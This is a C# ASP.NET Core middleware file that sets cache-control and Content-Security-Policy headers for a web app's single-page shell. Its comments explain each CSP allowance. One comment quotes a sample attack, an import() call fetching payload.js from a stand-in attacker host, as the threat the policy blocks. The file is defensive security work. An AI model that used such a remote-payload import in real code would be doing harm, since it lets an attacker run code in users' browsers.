using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;

namespace Nexus.Service.Security;

// Per-response cache-control + CSP headers for the SPA shell and any HTML
// payload.
internal static class SecurityHeadersMiddleware
{
    private static readonly HashSet<string> NoCacheShellPaths =
        new(StringComparer.OrdinalIgnoreCase) { "/", "/index.html", "/sw.js", "/manifest.webmanifest", "/panel-phone.webmanifest" };

    // CSP: applied to HTML responses (the panel SPA + any /panel/* shell).
    // Module workers inherit their creator document's CSP, so a policy here
    // also gates `import()` calls inside Tier 2 widget workers - blocking
    // `import("https://attacker.com/payload.js")` while still allowing
    // same-origin sibling imports under /apps-api/code/...
    //
    // 'unsafe-inline' on script-src/style-src is required for the SPA's
    // bootstrap script + React inline styles. It doesn't widen the
    // worker-import attack surface - `import()` resolution checks
    // host-source matches against the URL's origin, not against inline.
    //
    // Image whitelist covers Steam (avatars/game icons/game headers from
    // Valve CDNs) + Discord (avatars/guild icons/banners) + usercontent.
    // hellonexus.com (user-uploaded Nexus account avatars, R2-backed). All
    // are CDN-hosted URLs returned by the upstream APIs with no service-side
    // proxy, so the browser fetches them directly.
    //
    // frame-ancestors 'self' (not 'none') so PanelEmbedFrame.tsx can iframe
    // /panel?simulator=1 for the Y70/panel device popup. Same-origin only.
    //
    // connect-src must list the cloud API origin (api.hellonexus.com): the SPA
    // fetches the benchmark leaderboard + System Builder catalog directly from
    // it (VITE_API_URL in build:service), cross-origin from the service-served
    // http://localhost:9400 shell, so 'self' does not cover it.
    //
    // connect-src blob: because three.js's GLTFLoader loads a GLB's embedded
    // textures by fetch()ing blob: object URLs (ImageBitmapLoader); img-src
    // alone does not cover fetch, and without it models render untextured.
    private const string ContentSecurityPolicy =
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' blob:; " +
        "worker-src 'self' blob:; " +
        "child-src 'self' blob:; " +
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
        "font-src 'self' data: https://fonts.gstatic.com; " +
        "img-src 'self' data: blob: " +
        "https://*.steamstatic.com https://media.steampowered.com " +
        "https://cdn.discordapp.com https://media.discordapp.net " +
        "https://usercontent.hellonexus.com; " +
        "media-src 'self' data: blob:; " +
        "connect-src 'self' blob: ws: wss: https://api.hellonexus.com; " +
        "frame-ancestors 'self'; " +
        "base-uri 'self'; " +
        "object-src 'none'";

    public static IApplicationBuilder UseNexusSecurityHeaders(this IApplicationBuilder app) =>
        app.Use(async (ctx, next) =>
        {
            ctx.Response.OnStarting(() =>
            {
                var path = ctx.Request.Path.Value ?? string.Empty;
                // Panel-background assets are immutable (content-addressed by id);
                // they carry their own long-lived Cache-Control from the route so
                // the WebView caches them after one fetch (the Q60 streams over USB-FFS).
                // Route shape: /panel/devices/<deviceId>/background-media/<assetId>/{file,thumbnail}
                var isCacheableBgAsset = path.Contains("/background-media/", StringComparison.OrdinalIgnoreCase)
                    && (path.EndsWith("/file", StringComparison.OrdinalIgnoreCase)
                        || path.EndsWith("/thumbnail", StringComparison.OrdinalIgnoreCase));
                var noCacheShell = !isCacheableBgAsset
                    && (NoCacheShellPaths.Contains(path)
                        || path.StartsWith("/panel", StringComparison.OrdinalIgnoreCase));

                if (noCacheShell)
                {
                    ctx.Response.Headers.CacheControl = "no-store, no-cache, max-age=0, must-revalidate";
                    ctx.Response.Headers.Pragma = "no-cache";
                    ctx.Response.Headers.Expires = "0";
                }

                var contentType = ctx.Response.ContentType ?? string.Empty;
                var isHtml = contentType.StartsWith("text/html", StringComparison.OrdinalIgnoreCase);
                if (isHtml || noCacheShell)
                {
                    ctx.Response.Headers["Content-Security-Policy"] = ContentSecurityPolicy;
                    ctx.Response.Headers["X-Content-Type-Options"] = "nosniff";
                }

                return Task.CompletedTask;
            });
            await next();
        });
}
